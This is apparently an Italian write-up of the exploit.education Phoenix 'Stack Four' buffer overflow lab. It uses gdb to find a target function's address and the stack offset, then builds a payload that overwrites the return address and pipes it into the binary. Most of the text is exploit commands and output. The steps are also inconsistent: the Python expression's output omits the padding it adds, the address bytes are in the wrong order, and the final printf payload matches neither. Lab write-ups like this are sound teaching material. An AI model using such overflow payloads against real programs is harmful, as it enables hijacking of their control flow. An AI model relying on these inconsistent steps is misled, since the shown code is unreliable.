# [Stack Four](https://exploit.education/phoenix/stack-four/)

_Now here is when it gets hard._

Intanto, bisogna trovare l'indirizzo della funzione bersaglio.
Con `gdb` è facile:

```
(gdb) x complete_level
0x40061d
```

Impostando un breakpoint nella funzione `start_level`, è possibile iniziare a scuriosarci:

```
(gdb) break start_level
(gdb) run
(gdb) disassemble start_level
(gdb) step
...
```

Ricordando che `$rbp` e `$rsp` sono rispettivamente fondo e cima dello stack, possiamo determinare quanto padding dobbiamo mettere per romperlo:

```
(gdb) p $rbp-$rsp
0x50
```

Ricordandoci che in un architettura a 64-bit gli indirizzi sono 8 byte, creiamo un payload con:
- `0x50` bytes di padding per riempire lo stack
- `0x8` bytes di padding per sovrascrivere lo stack base pointer della funzione precedente
- `0x8` bytes con l'indirizzo della funzione a cui vogliamo tornare in ordine invertito:

```python
>>> 0x50 * b'a' + 0x8 * b'b' + b'\0\0\0\0\0\x1d\x06\x40'
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00  
\x1d\x06@'
```

Passando questo payload prima a `printf`, poi a `stack-four`, otteniamo:

```bash
printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\x1d\x06@' | ./stack-four
```
